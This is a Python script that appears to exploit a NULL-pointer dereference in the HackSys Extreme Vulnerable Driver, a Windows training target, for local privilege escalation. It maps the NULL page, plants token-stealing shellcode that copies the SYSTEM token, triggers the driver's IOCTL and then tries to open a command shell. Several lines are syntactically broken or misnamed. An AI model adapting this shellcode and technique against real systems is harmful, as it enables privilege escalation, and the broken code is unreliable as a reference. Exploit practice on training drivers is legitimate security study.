import struct, sys, ctypes
from ctypes import *
from ctypes.wintypes import *
from subprocess import * 

kernel32 = windll.kernel32
ntdll = windll.ntdll
GetCurrentProcess = windll.kernel32.GetCurrentProcess

HANDLE = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
if not HANDLE or HANDLE = -1:
    print("[-] Failed to get device handle")
    sys.exit(0)


print("[*] Mapping the NULL page")
result = ntdll.NtAllocationVirtualMemory(GetCurrentProcess(),pointer(c_void_p(1)),0 ,pointer(c_ulong(4096)), 0x3000,0x40)
if result != 0:
    print("[!] Unable to map NULL page with error: {}".format(str(GetLastError())))
    sys.exit(1)

shellcode = bytearray(
    "\x60"                            # pushad
    "\x31\xc0"                        # xor eax,eax
    "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    "\x8b\x40\x50"                    # mov eax,[eax+0x50]
    "\x89\xc1"                        # mov ecx,eax
    "\xba\x04\x00\x00\x00"            # mov edx,0x4
    "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    "\x75\xed"                        # jnz 0x1a
    "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    "\x61"                            # popad
    "\x5d"                            # pop ebp
    "\xc2\x08\x00"                    # ret 0x8
)

print("[+] Allocing RWX region for shellcode and copying shellcode to new region")
ptr = kernel32.VirtualAlloc(c_int(),c_int(len(shellcode)),c_int(0x3000),c_int(0x40)
memmove(ptr, create_string_buffer(shellcode), len(shellcode))
memmove(0x4, struct.pack("<L",ptr), 0x4)

buffer = "A" * 4

kernel32 = DeviceIoControl(HANDLE, 0x0022200B, buffer, len(buffer), None, 0, byref(c_ulong()), None)


Popen("Start System Cmd" shell=True)